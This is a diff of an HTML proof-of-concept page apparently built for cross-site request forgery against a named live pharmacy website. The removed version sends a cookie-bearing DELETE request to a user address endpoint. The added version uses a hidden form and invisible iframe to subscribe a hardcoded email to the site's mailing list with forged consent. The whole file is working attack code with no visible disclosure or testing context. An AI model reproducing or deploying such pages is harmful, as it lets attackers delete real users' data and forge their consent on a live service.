@@ -2,32 +2,21 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF PoC - DELETE Request</title>
+  <title>CSRF PoC - Mailing Subscription</title>
 </head>
 <body>
-  <h1>CSRF PoC - Real DELETE Request</h1>
-  <p>Click the button below to send a DELETE request to the target API.</p>
+  <h2>CSRF PoC - Subscribe User to Mailing</h2>
+  <p>Click the button below to submit the POST request manually.</p>
 
-  <button onclick="sendDelete()">Send DELETE</button>
+  <form action="https://www.redcare-pharmacie.fr/homeone/api/bully/mailing-subscription/v1/fr/subscriptions" method="POST" target="hiddenFrame">
+    <!-- Modify fields as needed by the API -->
+    <input type="hidden" name="email" value="noyono010101@gmail.com">
+    <input type="hidden" name="newsletterType" value="general">
+    <input type="hidden" name="consent" value="true">
+    <input type="submit" value="Subscribe via CSRF">
+  </form>
 
-  <script>
-    function sendDelete() {
-      fetch("https://www.redcare-pharmacie.fr/webclient/api/cacheable/addresses/v2/fr/685fafd2602f60227d1bb947", {
-        method: "DELETE",
-        credentials: "include", // important for sending cookies
-        headers: {
-          "Accept": "application/json",
-          "Content-Type": "application/json"
-        }
-      })
-      .then(res => res.text())
-      .then(data => {
-        alert("Response:\n" + data);
-      })
-      .catch(err => {
-        alert("Error:\n" + err);
-      });
-    }
-  </script>
+  <!-- Hidden iframe to prevent visible redirect -->
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
 </body>
 </html>
